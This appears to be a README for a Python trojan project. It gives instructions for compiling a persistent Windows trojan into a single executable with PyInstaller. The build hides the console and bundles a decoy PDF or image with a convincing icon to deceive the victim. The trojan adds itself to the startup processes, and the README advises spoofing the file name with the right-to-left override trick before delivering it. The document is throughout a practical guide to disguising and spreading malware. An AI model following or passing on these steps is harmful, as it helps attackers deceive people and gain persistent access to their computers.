Pretty decent generic code to introduce a persistent trojan, particularyly into windows devices. Look at the source code to get details. You would want to compile this in a windows terminal, then send the exe file to the victim. As of right now all it does is print "i hacked you" into a terminal, and adds itself to the startup processes.

	In Windows machine terminal run:
<pyinstallerPath> <name of this file> --onefile --add-data "<name of pdf/jpeg>;." --noconsole --icon <path to ico>

	*pyintaller path
		the path to the python installer exe in your windows, it will interpret the remaining commands
	*name of this file
		either the path to the package file, or just the name if in the directory containing it
	*onefile
		compiles everything into one exe file output
	*add-data
		adds a pic or something to throw of the victim
	*name of jpg
		atil did the whole path to the file, also pay attention to surrounding quotes and the ;. after the path name
	*--noconsole
		doesn't open a visible console on victim's computer
	*icon
		add if you want to specify a .ico file to show as thumbnail if you want it to be more believable

Atil's Example:

C:\Users\IEUser\AppData\Local\Program\Python\Python37-32\Scripts\pyinstaller.exe MyPackage.py --onefile --add-data "C:\Users\IEUser\Desktop\mettallica.pdf;." --noconsole --icon C:\Users\IEUser\Desktop\pdf.ico


Once you have the desired exe, you can spoof the name with the right to left method, and deliver to victim. 
